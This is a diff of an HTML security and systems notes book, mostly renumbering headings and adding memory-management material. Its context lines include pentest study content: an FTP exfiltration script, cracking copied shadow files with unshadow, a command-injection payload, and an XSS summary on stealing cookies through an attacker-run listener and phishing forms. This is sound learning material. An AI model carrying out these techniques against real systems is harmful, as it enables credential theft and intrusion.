 <p>File inclusion flaws happen when <strong>HTTP parameters or path segments choose a file</strong> to load or render, and that choice is <strong>not safely constrained</strong>. <strong>Local File Inclusion (LFI)</strong> lets attackers read (or sometimes execute) arbitrary server files—common around <strong>templating</strong> patterns such as <code>index.php?page=about</code> where the <code>page</code> fragment maps to an include path. Impacts include <strong>source disclosure</strong>, <strong>secret leakage</strong> (keys, credentials, configs), and under some primitives <strong>remote code execution</strong>. Examples span <strong>PHP</strong> (<code>include</code> / <code>require</code> / <code>file_get_contents</code> and friends), <strong>Node</strong> (<code>fs.readFile</code>, <code>path.join</code> breakout, <code>res.render</code> with interpolated paths), <strong>Java/JSP</strong> (<code>jsp:include</code>, <code>c:import</code>), and <strong>.NET</strong> (<code>Response.WriteFile</code>, <code>@Html.Partial</code>, SSI includes). A key review axis is <strong>read-only vs execute</strong> and <strong>local vs remote URL</strong> support: execution-capable includes (e.g. PHP <code>include</code>, some <code>c:import</code> / SSI cases) widen blast radius to <strong>RCE</strong>, while read-only sinks still enable <strong>credential and logic leakage</strong>. Defensive themes are <strong>allowlisting</strong>, <strong>canonical path checks</strong>, and <strong>never wiring raw request data into filesystem or template resolution</strong>.</p>
 <p>For <strong>exploitation mechanics</strong>, see <a href="#local-file-inclusion-lfi--exploitation-basics">local-file-inclusion.md</a>: swapping parameters for system files (e.g. <code>/etc/passwd</code>), <strong><code>../</code> path traversal</strong> when a directory is prepended, <strong><code>/</code>-led payloads</strong> when a <strong>filename prefix</strong> is concatenated, the effect of <strong>appended extensions</strong>, <strong>second-order</strong> LFI via stored fields (e.g. usernames used in download paths), and the lab distinction between <strong>reading PHP source</strong> vs <strong>executing</strong> it.</p>
 <p>For <strong>filter and normalizer bypasses</strong> (single-pass <code>../</code> stripping, URL/double encoding, regex-approved path prefixes, and legacy PHP tricks for forced extensions), see <a href="#local-file-inclusion-lfi--basic-bypasses">lfi-basic-bypasses.md</a>.</p>
@@ -30163,7 +31316,7 @@ sudo mount -t cifs //&lt;IP&gt;/sharename /mnt/smb -o username=user
 cp file.txt /mnt/smb/
 sudo umount /mnt/smb
 </code></pre>
-<h2 id="summary-16"><a class="header" href="#summary-16">Summary</a></h2>
+<h2 id="summary-17"><a class="header" href="#summary-17">Summary</a></h2>
 <ul>
 <li><strong>Base64</strong>: No network needed, limited by terminal/paste buffer size</li>
 <li><strong>HTTP/HTTPS</strong>: Most common, multiple tools (curl, wget, Python), often allowed outbound</li>
@@ -30298,7 +31451,7 @@ echo PUT &lt;file&gt; &gt;&gt; ftpcommand.txt
 echo bye &gt;&gt; ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 </code></pre>
-<h2 id="summary-17"><a class="header" href="#summary-17">Summary</a></h2>
+<h2 id="summary-18"><a class="header" href="#summary-18">Summary</a></h2>
 <ul>
 <li><strong>Base64</strong>: No network needed, limited by terminal length</li>
 <li><strong>PowerShell WebClient</strong>: HTTP/HTTPS, most common, supports fileless execution</li>
@@ -30403,10 +31556,10 @@ Authorization: Basic YWxpY2U6c2VjcmV0MTIz
 <pre><code class="language-shell-session">cupp -i
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="enumeration-methodology-1"><a href="#enumeration-methodology-1" class="header">Enumeration Methodology</a></h1>
+<h1 id="enumeration-methodology-2"><a href="#enumeration-methodology-2" class="header">Enumeration Methodology</a></h1>
 <p>Our goal is not to get at the systems but to find all the ways to get there.</p>
 <hr>
-<h2 id="enumeration-methodology"><a class="header" href="#enumeration-methodology">Enumeration Methodology</a></h2>
+<h2 id="enumeration-methodology-1"><a class="header" href="#enumeration-methodology-1">Enumeration Methodology</a></h2>
 <p>The whole enumeration process is divided into three different levels</p>
 <div class="table-wrapper">
 <table>
@@ -30990,7 +32143,7 @@ Thus using an <strong>ACK scan</strong> (-sA) might be a good idea because the f
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-authentication"><a class="header" href="#linux-authentication">Linux Authentication</a></h1>
-<h2 id="summary-18"><a class="header" href="#summary-18">Summary</a></h2>
+<h2 id="summary-19"><a class="header" href="#summary-19">Summary</a></h2>
 <p>Linux uses Pluggable Authentication Modules (PAM) for authentication. The key modules (<code>pam_unix.so</code>, <code>pam_unix2.so</code>) are located in <code>/usr/lib/x86_64-linux-gnu/security/</code> on Debian-based systems. PAM handles user information, authentication, sessions, and password changes.</p>
 <h3 id="key-files-1"><a class="header" href="#key-files-1">Key Files</a></h3>
 <div class="table-wrapper">
@@ -31116,7 +32269,7 @@ unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes
 </div>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="pivoting-tunneling-and-port-forwarding-1"><a class="header" href="#pivoting-tunneling-and-port-forwarding-1">Pivoting, Tunneling, and Port Forwarding</a></h1>
-<h2 id="directory-map-25"><a class="header" href="#directory-map-25">Directory Map</a></h2>
+<h2 id="directory-map-26"><a class="header" href="#directory-map-26">Directory Map</a></h2>
 <ul>
 <li><a href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></li>
 <li><a href="#ssh-dynamic-port-forwarding-with-socks">SSH Dynamic Port Forwarding</a></li>
@@ -31775,13 +32928,13 @@ debug1: channel 1: connected to 0.0.0.0 port 8000
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="sql-1"><a class="header" href="#sql-1">SQL</a></h1>
-<h2 id="directory-map-26"><a class="header" href="#directory-map-26">Directory Map</a></h2>
+<h2 id="directory-map-27"><a class="header" href="#directory-map-27">Directory Map</a></h2>
 <ul>
 <li><a href="#attacking-sql-databases">Attacking SQL Databases</a></li>
 <li><a href="#intro-to-sql-injections">Intro to SQL Injections</a></li>
 <li><a href="#subverting-query-logic">Subverting Query Logic</a></li>
 </ul>
-<h2 id="summary-19"><a class="header" href="#summary-19">Summary</a></h2>
+<h2 id="summary-20"><a class="header" href="#summary-20">Summary</a></h2>
 <p>Notes on attacking MySQL and MSSQL databases. Covers enumeration, authentication modes, connecting to databases, command execution (xp_cmdshell, webshells), privilege escalation via user impersonation, lateral movement through linked servers, and hash stealing techniques. Also covers SQL injection fundamentals including how unsanitized user input leads to injection, syntax error handling, the taxonomy of injection types (in-band, blind, and out-of-band), and subverting query logic with OR injection for authentication bypass.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="attacking-sql-databases"><a class="header" href="#attacking-sql-databases">Attacking SQL Databases</a></h1>
@@ -32112,7 +33265,7 @@ $result = $conn-&gt;query($query);
 <h1 id="openvas"><a href="#openvas" class="header">Openvas</a></h1>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="web-attacks-1"><a class="header" href="#web-attacks-1">Web Attacks</a></h1>
-<h2 id="directory-map-27"><a class="header" href="#directory-map-27">Directory map</a></h2>
+<h2 id="directory-map-28"><a class="header" href="#directory-map-28">Directory map</a></h2>
 <ul>
 <li><a href="#introduction-to-web-attacks">Introduction — web attack context, HTTP Verb Tampering, IDOR, XXE overview</a></li>
 <li><a href="#http-verb-tampering">HTTP Verb Tampering — HTTP methods, insecure server config, insecure coding, auth bypass</a></li>
@@ -32128,7 +33281,7 @@ $result = $conn-&gt;query($query);
 <li><a href="#xxe--blind-data-exfiltration">XXE blind data exfiltration — OOB via HTTP, PHP listener, DNS OOB, XXEinjector</a></li>
 <li><a href="#idor--bypassing-encoded-references">IDOR — Bypassing Encoded References — MD5/Base64 schemes, function disclosure, reproducing hashes, mass enumeration script</a></li>
 </ul>
-<h2 id="summary-20"><a class="header" href="#summary-20">Summary</a></h2>
+<h2 id="summary-21"><a class="header" href="#summary-21">Summary</a></h2>
 <p>Web attacks are the most common class of attacks against businesses, targeting external-facing applications, internal web apps, and API endpoints alike. This section covers three attack types found across many web applications. <strong>HTTP Verb Tampering</strong> exploits servers that accept unexpected HTTP methods, allowing attackers to bypass authorization mechanisms and security controls by sending requests with non-standard verbs. <strong>Insecure Direct Object References (IDOR)</strong> exploit weak or missing back-end access controls: when applications use predictable identifiers (sequential IDs, user numbers) to reference resources, an attacker can guess or calculate valid IDs to access other users’ data. <strong>XML External Entity (XXE) Injection</strong> targets applications using outdated XML parsers to process user-supplied XML — malicious payloads can read local files (configs, source code, credentials), enable whitebox testing, steal server credentials, and potentially achieve remote code execution.</p>
 <p>HTTP Verb Tampering vulnerabilities stem from two sources. <strong>Insecure server configuration</strong> occurs when authentication rules are scoped to specific methods (e.g., <code>&lt;Limit GET POST&gt;</code>) leaving any other verb — such as <code>HEAD</code> — unauthenticated and freely accessible. <strong>Insecure coding</strong> occurs when input sanitization is applied to one HTTP method (e.g., <code>$_GET</code>) while the query uses a broader parameter source (e.g., <code>$_REQUEST</code>), allowing an attacker to switch to POST to bypass the filter entirely. The coding variant is more prevalent because it arises from common developer mistakes rather than misconfiguration.</p>
 <p><strong>Bypassing security filters</strong> is the more common variant: if a filter only inspects one method’s parameter source (e.g., <code>$_POST</code>), switching to a different method (e.g., GET) carries the payload through an unchecked channel while the underlying function (using <code>$_REQUEST</code>) still processes it. To confirm exploitation, use a two-file command injection payload (<code>file1; touch file2;</code>) — both files appearing proves command execution. A web app that appears fully filtered against injection may be completely exposed once the method is switched.</p>
@@ -32392,7 +33545,7 @@ done
 contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
 ...
 </code></pre>
-<h2 id="key-takeaways-9"><a class="header" href="#key-takeaways-9">Key takeaways</a></h2>
+<h2 id="key-takeaways-10"><a class="header" href="#key-takeaways-10">Key takeaways</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -34479,7 +35632,7 @@ https://www.microsoft.com/en-us/msrc/blog/2014/06/an-overview-of-kb2871997
 https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="xss-cross-site-scripting-1"><a class="header" href="#xss-cross-site-scripting-1">XSS (Cross-Site Scripting)</a></h1>
-<h2 id="directory-map-28"><a class="header" href="#directory-map-28">Directory map</a></h2>
+<h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory map</a></h2>
 <ul>
 <li><a href="#cross-site-scripting-xss--introduction">Introduction — what XSS is, risk, examples, types</a></li>
 <li><a href="#stored-persistent-xss">Stored (persistent) XSS — impact, testing, persistence checks</a></li>
@@ -34491,7 +35644,7 @@ https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-p
 <li><a href="#xss-blind-detection--session-hijacking-cookie-stealing">XSS session hijacking — blind XSS, remote script OOB, cookie exfil, Firefox storage</a></li>
 <li><a href="#xss-prevention">XSS prevention — sources/sinks, validation, encoding, CSP, cookies</a></li>
 </ul>
-<h2 id="summary-21"><a class="header" href="#summary-21">Summary</a></h2>
+<h2 id="summary-22"><a class="header" href="#summary-22">Summary</a></h2>
 <p>Cross-site scripting lets attackers run JavaScript in victims’ browsers when applications fail to sanitize or encode user-controlled data. Notes cover client-side execution, typical impacts (session theft, forced actions, abuse of browser APIs), limits of pure XSS versus chaining with browser bugs, notable incidents (Samy worm, TweetDeck), and the three main types: <strong>stored</strong>, <strong>reflected</strong>, and <strong>DOM-based</strong> XSS. <strong>Stored</strong> XSS is covered in depth: saved payloads, wide victim pool, remediation in the database, basic PoC payloads (<code>alert(window.origin)</code>, <code>&lt;plaintext&gt;</code>, <code>print()</code>), iframe/origin confirmation, and using refresh to verify persistence. <strong>Reflected</strong> XSS is summarized separately: non-persistent behavior (vs DOM-based), error-message reflection, empty-quotes UI vs view-source confirmation, and delivering GET-based attacks via malicious URLs. <strong>DOM-based</strong> XSS is summarized separately: client-only processing, hash/URL sources, view-source vs inspector, source and sink functions, why <code>innerHTML</code> often blocks <code>&lt;script&gt;</code>, and event-handler payloads (e.g. <code>img</code> / <code>onerror</code>) delivered via shared URLs. <strong>XSS phishing</strong> is summarized separately: <strong>trusted-domain</strong> fake login UI that posts credentials to the attacker; <strong>authorized</strong> use as <strong>awareness simulations</strong>; <strong><code>/phishing</code>-style image URL</strong> labs where a raw <strong><code>&lt;script&gt;</code></strong> test often fails until <strong>source/context</strong> review; <strong><code>document.write</code></strong> for minified form HTML; <strong><code>getElementById('urlform').remove()</code></strong> after inspector (<strong><code>Ctrl+Shift+C</code></strong>) to drop the real URL field; <strong><code>&lt;!--</code></strong> after the payload to comment out trailing template; <strong>reflected</strong> delivery via a copied <strong>malicious URL</strong>; <strong>netcat</strong> on port <strong>80</strong> for quick <strong>GET</strong> <code>/?username=…&amp;password=…</code> capture vs a <strong>PHP</strong> listener that <strong>logs</strong> to <strong><code>creds.txt</code></strong> and <strong>redirects</strong> to the clean app so the victim does not see a broken HTTP response. <strong>XSS discovery</strong> is summarized separately: <strong>automated</strong> scanning (passive DOM hints vs active payload injection; commercial vs OSS tradeoffs), tools such as <strong>XSStrike</strong> / <strong>Brute XSS</strong> / <strong>XSSer</strong> and why <strong>reflection in HTML ≠ execution</strong>, <strong>manual</strong> testing with public payload lists and non-form sinks (<strong>headers</strong> like <strong>Cookie</strong> / <strong>User-Agent</strong>), why generic lists miss simple labs, optional custom scripting for odd targets, and <strong>manual code review</strong> as the most reliable path when full data flow is visible (with deeper secure-coding / white-box study left to other modules). <strong>XSS defacing</strong> is summarized separately: using <strong>stored</strong> XSS for <strong>persistent</strong> visual takeover, <strong>reputation</strong> impact (e.g. public sector defacements), four common levers (<strong><code>document.body.style.background</code></strong>, <strong><code>document.body.background</code></strong>, <strong><code>document.title</code></strong>, <strong><code>innerHTML</code></strong>), swapping <strong>full <code>&lt;body&gt;</code></strong> markup (with <strong><code>getElementsByTagName('body')[0]</code></strong>), optional <strong>jQuery</strong> when present, <strong>minified</strong> one-line HTML inside payloads, and how <strong>view-source</strong> can still show original structure while the <strong>rendered DOM</strong> looks defaced—plus <strong>injection position</strong> (end vs middle of page) affecting what later content might still appear. <strong>XSS session hijacking / blind XSS</strong> is summarized separately: <strong>cookies</strong> as session handles; <strong>blind</strong> sinks (<strong>admin</strong> panels, tickets, reviews, <strong><code>User-Agent</code></strong>); <strong><code>/hijacking</code></strong>-style registration reviewed by staff; <strong>OOB</strong> detection via <strong><code>&lt;script src=http://IP/fieldname&gt;</code></strong> so the <strong>request path</strong> names the vulnerable input; <strong>PayloadsAllTheThings</strong>-style <strong>quote-break</strong> variants and <strong>XHR</strong> / <strong><code>$.getScript</code></strong> when jQuery exists; <strong><code>sudo php -S 0.0.0.0:80</code></strong> to catch callbacks; pragmatic <strong>skips</strong> (<strong>email</strong> validation, <strong>password</strong> unlikely echoed); then <strong><code>new Image().src</code></strong> (vs <strong><code>document.location</code></strong>) to send <strong><code>document.cookie</code></strong> in a <strong>GET</strong> to <strong><code>index.php?c=</code></strong>, <strong>PHP</strong> splitting on <strong><code>;</code></strong>, <strong><code>urldecode</code></strong>, <strong><code>cookies.txt</code></strong> lines with <strong><code>REMOTE_ADDR</code></strong>; replay in <strong>Firefox Storage</strong> (<strong><code>Shift+F9</code></strong>) by adding <strong>name/value</strong> and refreshing—plus <strong><code>HttpOnly</code></strong> as the main cookie theft mitigation. <strong>XSS prevention</strong> is summarized separately: secure <strong>sources</strong> and <strong>sinks</strong> on <strong>client and server</strong>; front-end <strong>regex validation</strong> (e.g. email), <strong>DOMPurify</strong> for client-side HTML sanitization, avoiding <strong><code>&lt;script&gt;</code> / <code>&lt;style&gt;</code> / attributes / comments</strong> built from input and dangerous APIs (<strong><code>innerHTML</code></strong>, <strong><code>document.write</code></strong>, <strong><code>document.domain</code></strong>, jQuery <strong><code>.html()</code></strong> / <strong><code>parseHTML()</code></strong> / insertion helpers); back-end <strong><code>filter_var</code></strong> / validation, sanitization libraries, <strong>never raw echo</strong> of request params; <strong>output encoding</strong> with <strong><code>htmlspecialchars</code>/<code>htmlentities</code></strong> (PHP) or <strong><code>html-entities</code></strong> (Node); deployment levers (<strong>HTTPS</strong>, <strong>CSP</strong> like <strong><code>script-src 'self'</code></strong>, <strong><code>X-Content-Type-Options: nosniff</code></strong>, <strong><code>HttpOnly</code>/<code>Secure</code></strong> cookies, <strong>WAF</strong>, framework defaults such as <strong>ASP.NET</strong>); and ongoing <strong>offensive retesting</strong> because secure coding plus config can still miss edge cases—the note clarifies that <strong><code>addslashes</code></strong> alone is a weak primary HTML-XSS control versus <strong>contextual encoding</strong>.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="dom-based-xss"><a class="header" href="#dom-based-xss">DOM-Based XSS</a></h1>
@@ -35008,7 +36161,7 @@ if (isset($_GET['c'])) {
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h1>
-<h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
+<h2 id="directory-map-30"><a class="header" href="#directory-map-30">Directory Map</a></h2>
 <ul>
 <li><a href="kubernetes/cks">cks</a></li>
 <li><a href="kubernetes/kcna">kcna</a></li>
@@ -35016,7 +36169,7 @@ if (isset($_GET['c'])) {
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="cks"><a class="header" href="#cks">CKS</a></h1>
-<h2 id="directory-map-30"><a class="header" href="#directory-map-30">Directory Map</a></h2>
+<h2 id="directory-map-31"><a class="header" href="#directory-map-31">Directory Map</a></h2>
 <ul>
 <li><a href="#certified-kubernetes-security-specialist-cks-notes">notes</a></li>
 <li><a href="#kubernetes-security-specialist-cks-practice-scenarios">questions</a></li>
@@ -35230,7 +36383,7 @@ if (isset($_GET['c'])) {
 <ul>
 <li><a href="#sbom">SBOM</a></li>
 <li><a href="#reduce-docker-image-size">Reduce docker image size</a></li>
-<li><a href="#static-analysis">Static Analysis</a>
+<li><a href="#static-analysis-2">Static Analysis</a>
 <ul>
 <li><a href="#sbom-1">SBOM</a></li>
 <li><a href="#kubesec">Kubesec</a></li>
@@ -37663,7 +38816,7 @@ spec:
 <p><code>dive</code> and <code>docker-slim</code> are two tools you can use to explore the individual layers that make up an image</p>
 </li>
 </ul>
-<h2 id="static-analysis"><a class="header" href="#static-analysis">Static Analysis</a></h2>
+<h2 id="static-analysis-2"><a class="header" href="#static-analysis-2">Static Analysis</a></h2>
 <h3 id="sbom-1"><a class="header" href="#sbom-1">SBOM</a></h3>
 <ul>
 <li>A SBOM is a list of all the software that makes up a container image (or an application, etc.)</li>
@@ -38131,7 +39284,7 @@ EOF
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kcna"><a class="header" href="#kcna">KCNA</a></h1>
-<h2 id="directory-map-31"><a class="header" href="#directory-map-31">Directory Map</a></h2>
+<h2 id="directory-map-32"><a class="header" href="#directory-map-32">Directory Map</a></h2>
 <ul>
 <li><a href="#kubernetes-certified-native-associate-kcna-notes">notes</a></li>
 </ul>
@@ -38665,7 +39818,7 @@ spec:
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kcsa"><a class="header" href="#kcsa">KCSA</a></h1>
-<h2 id="directory-map-32"><a class="header" href="#directory-map-32">Directory Map</a></h2>
+<h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
 <ul>
 <li><a href="#kubernetes-certified-security-associate-kcsa-notes">notes</a></li>
 </ul>
@@ -39199,7 +40352,7 @@ spec:
 <p><code>dive</code> and <code>docker-slim</code> are two tools you can use to explore the individual layers that make up an image</p>
 </li>
 </ul>
-<h3 id="static-analysis-1"><a class="header" href="#static-analysis-1">Static Analysis</a></h3>
+<h3 id="static-analysis-3"><a class="header" href="#static-analysis-3">Static Analysis</a></h3>
 <h4 id="sbom-2"><a class="header" href="#sbom-2">SBOM</a></h4>
 <ul>
 <li>A SBOM is a list of all the software that makes up a container image (or an application, etc.)</li>
@@ -39266,7 +40419,7 @@ spec:
 </h4>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
-<h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
+<h2 id="directory-map-34"><a class="header" href="#directory-map-34">Directory Map</a></h2>
 <ul>
 <li><a href="networking/browser-networking">browser-networking</a></li>
 <li><a href="networking/http">http</a></li>
@@ -39296,7 +40449,7 @@ spec:
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="browser-networking"><a class="header" href="#browser-networking">Browser Networking</a></h1>
-<h2 id="directory-map-34"><a class="header" href="#directory-map-34">Directory Map</a></h2>
+<h2 id="directory-map-35"><a class="header" href="#directory-map-35">Directory Map</a></h2>
 <ul>
 <li><a href="#chapter-1">chapter01</a></li>
 <li><a href="#chapter-2">chapter02</a></li>
@@ -39569,7 +40722,7 @@ Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]                           
 <p>WebSockets can transfer test or binary data.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http-1"><a class="header" href="#http-1">HTTP</a></h1>
-<h2 id="directory-map-35"><a class="header" href="#directory-map-35">Directory Map</a></h2>
+<h2 id="directory-map-36"><a class="header" href="#directory-map-36">Directory Map</a></h2>
 <ul>
 <li><a href="#clean-urls">clean_urls</a></li>
 <li><a href="#http-persistent-connection">persistent_connections</a></li>
@@ -39818,7 +40971,7 @@ https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="load-balancing"><a class="header" href="#load-balancing">Load Balancing</a></h1>
-<h2 id="directory-map-36"><a class="header" href="#directory-map-36">Directory Map</a></h2>
+<h2 id="directory-map-37"><a class="header" href="#directory-map-37">Directory Map</a></h2>
 <ul>
 <li><a href="#load-balancing-1">load-balancing</a></li>
 </ul>
@@ -39853,7 +41006,7 @@ https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="nginx"><a class="header" href="#nginx">Nginx</a></h1>
-<h2 id="directory-map-37"><a class="header" href="#directory-map-37">Directory Map</a></h2>
+<h2 id="directory-map-38"><a class="header" href="#directory-map-38">Directory Map</a></h2>
 <ul>
 <li><a href="#custom-header-response">custom-header-response</a></li>
 </ul>
@@ -39867,7 +41020,7 @@ https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="protocols-1"><a class="header" href="#protocols-1">Protocols</a></h1>
-<h2 id="directory-map-38"><a class="header" href="#directory-map-38">Directory Map</a></h2>
+<h2 id="directory-map-39"><a class="header" href="#directory-map-39">Directory Map</a></h2>
 <ul>
 <li><a href="#dns-3">dns</a></li>
 <li><a href="#ftp-2">ftp</a></li>
@@ -40932,7 +42085,7 @@ iso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: "python3-apt_2.0.0ubuntu0.20.04.6_amd64"
 <h1 id="websockets"><a class="header" href="#websockets">WebSockets</a></h1>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="rate-limiting-algorithms"><a class="header" href="#rate-limiting-algorithms">Rate Limiting Algorithms</a></h1>
-<h2 id="directory-map-39"><a class="header" href="#directory-map-39">Directory Map</a></h2>
+<h2 id="directory-map-40"><a class="header" href="#directory-map-40">Directory Map</a></h2>
 <ul>
 <li><a href="#fixed-window-counter-algorithm">fixed-window-counter</a></li>
 <li><a href="#leaking-bucket-algorithm">leaking-bucket</a></li>
@@ -41089,7 +42242,7 @@ func main() {
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="redis-1"><a class="header" href="#redis-1">Redis</a></h1>
-<h2 id="directory-map-40"><a class="header" href="#directory-map-40">Directory Map</a></h2>
+<h2 id="directory-map-41"><a class="header" href="#directory-map-41">Directory Map</a></h2>
 <ul>
 <li><a href="#redis-2">redis</a></li>
 </ul>
@@ -41131,7 +42284,7 @@ The SLOWLOG GET command returns entries from the slow log in chronological order
 <li><a href="#hard-and-soft-links">Hard and Soft Links</a></li>
 <li><a href="#lvm-logical-volume-manager">LVM (Logical Volume Manager)</a></li>
 <li><a href="#memory">Memory</a></li>
-<li><a href="#memory-management">Memory Management</a></li>
+<li><a href="#memory-management">Memory Management</a> — stack vs heap, paging, virtual address structure (VPN/offset), address translation, page table entry flags, TLB, linear and multi-level page table structures, x86-64 four-level page table</li>
 <li><a href="#networking-1">Networking</a></li>
 <li><a href="#network-manager">Network Manager</a></li>
 <li><a href="#permissions">Permissions</a></li>
@@ -41158,7 +42311,7 @@ The SLOWLOG GET command returns entries from the slow log in chronological order
 <ul>
 <li><a href="#kernel-subsystems">Kernel</a></li>
 <li><a href="#interrupts-and-traps">Interrupts</a></li>
-<li><a href="#system-calls">System Calls</a></li>
+<li><a href="#system-calls">System Calls</a> — user/kernel mode, trap mechanism, IDT, syscall numbers, C library wrappers, process states, fork/exec/exit/wait/waitpid, file I/O (open/read/write/close), signals (kill/sigaction), memory (brk/mmap)</li>
 <li><a href="#key-value-store-1">Key-Value Stores</a></li>
 <li><a href="#process-scheduling">Process Scheduling</a></li>
 </ul>
@@ -42232,8 +43385,8 @@ Node 0, zone   Normal   3170   7694  10543   8113   5011   1761    552    182   
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="memory-management"><a class="header" href="#memory-management">Memory Management</a></h1>
 <ul>
-<li>When you get done using heap memory, it needs to be cleaned up. This can done using a process known as ‘garbage collection’, or manually by the developer when creating the app</li>
-<li>Implementation of both the stack and heap is usually down to the runtime / OS.</li>
+<li>When you get done using heap memory, it needs to be cleaned up. This can done using a process known as ‘garbage collection’, or manually by the developer when creating the app
+Implementation of both the stack and heap is usually down to the runtime / OS.</li>
 <li>There are 2 memory constructs, stack and heap.</li>
 </ul>
 <h3 id="stack"><a class="header" href="#stack">Stack:</a></h3>
@@ -42287,6 +43440,319 @@ Node 0, zone   Normal   3170   7694  10543   8113   5011   1761    552    182   
 <li>Sharing: Heap objects can be shared between multiple threads, while stack objects are local to a single thread.</li>
 <li>Polymorphism: Creating objects on the heap allows for polymorphism, where objects of different derived classes can be referenced using a base class pointer.</li>
 </ol>
+<h3 id="free-space-management"><a class="header" href="#free-space-management">Free space Management</a></h3>
+<ul>
+<li><code>malloc</code> is one example of a library used to manage4 pages of a process’s heap, the OS manages the address space of a process</li>
+<li>managing free space is simple when the space being managed is divided into fixed-size units. When a client requests memory, just return the first available segment.</li>
+<li>Free space management becomes difficult when the free space you are managing consists of variable-sized segments.</li>
+<li>This is external fragmentation</li>
+<li>The generic data structure used to manage free space in the heap is known as the “free list”. The free list contains links to all free chunks of space in the managed memory.</li>
+<li>Any modern memory allocator will handle both splitting and coalescing</li>
+<li>Most allocators store a little bit of extra information in a header block which is kept in memory. The header contains the size of the allocated region, and potentially a magic number to provider additional integrity checking, additional pointers to speed up deallocation, etc.</li>
+</ul>
+<h3 id="paging-1"><a class="header" href="#paging-1">Paging</a></h3>
+<ul>
+<li>It is said that the operating system takes two approaches when solving most any space-management problem: the first approach is to chop things up into variable-sized pieces (i.e. segmentation), this can lead to fragmentation and becomes difficult to manage over time. The second approach chops things up into fixesd-sized pieces (i.e. paging). With paging, we divide a processes address space into a number of fixed-sized units known as ‘pages’. We then view physical memory as a number of fixed-sized slots called “page frames”, each of which can contain a single virtual memory page.</li>
+</ul>
+<p>Physical memory (100 MB total (we choose a small size here for simplicity)):
+Pages frames:
+|——————|</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>- Frame 0 (25MB) -</th></tr>
+</thead>
+<tbody>
+<tr><td>- Frame 1 (25MB) -</td></tr>
+<tr><td>——————</td></tr>
+<tr><td>- Frame 2 (25MB) -</td></tr>
+<tr><td>——————</td></tr>
+<tr><td>- Frame 3 (25MB) -</td></tr>
+<tr><td>——————</td></tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li>These frames can exist practically anywhere in physical memory. The OS keeps track of the virtual-to-physical mapping in a “page table”.  The page table is a “per-process” data structure.</li>
+</ul>
+<p>Page table for process with PID 8012:
+|———————————————|</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>- Virtual Frame 0 (25MB) &gt; Physical frame 0 -</th></tr>
+</thead>
+<tbody>
+<tr><td>- Virtual Frame 1 (25MB) &gt; Physical frame 6 -</td></tr>
+<tr><td>———————————————</td></tr>
+<tr><td>- Virtual Frame 2 (25MB) &gt; Physical frame 1 -</td></tr>
+<tr><td>———————————————</td></tr>
+<tr><td>- Virtual Frame 3 (25MB) &gt; Physical frame 3 -</td></tr>
+<tr><td>———————————————</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="virtual-address-structure"><a class="header" href="#virtual-address-structure">Virtual Address Structure</a></h3>
+<ul>
+<li>Every virtual address issued by a process is split into two parts by the hardware:
+<ul>
+<li><strong>Virtual Page Number (VPN)</strong> — identifies which page the address falls in</li>
+<li><strong>Page Offset</strong> — the byte position <em>within</em> that page</li>
+</ul>
+</li>
+<li>The page size determines how many bits go to the offset. A 4 KB page needs 12 bits (2^12 = 4096).</li>
+<li>The remaining bits form the VPN.</li>
+</ul>
+<p>32-bit virtual address with 4 KB pages (12-bit offset, 20-bit VPN):</p>
+<pre><code> 31                 12 11                 0
+ |-------- VPN -------|------ Offset ------|
+ |     20 bits        |      12 bits       |
+ |--------------------|-------------------|
+</code></pre>
+<p>64-bit virtual address with 4 KB pages (common on x86-64):</p>
+<pre><code> 63          48 47          12 11          0
+ |-- unused --|---- VPN -----|-- Offset ---|
+ |  16 bits   |   36 bits    |   12 bits   |
+ |------------|--------------|-------------|
+</code></pre>
+<p>(x86-64 only uses 48 bits for virtual addresses in practice; bits 48–63 are sign-extended.)</p>
+<h3 id="translating-a-virtual-address-to-a-physical-address"><a class="header" href="#translating-a-virtual-address-to-a-physical-address">Translating a Virtual Address to a Physical Address</a></h3>
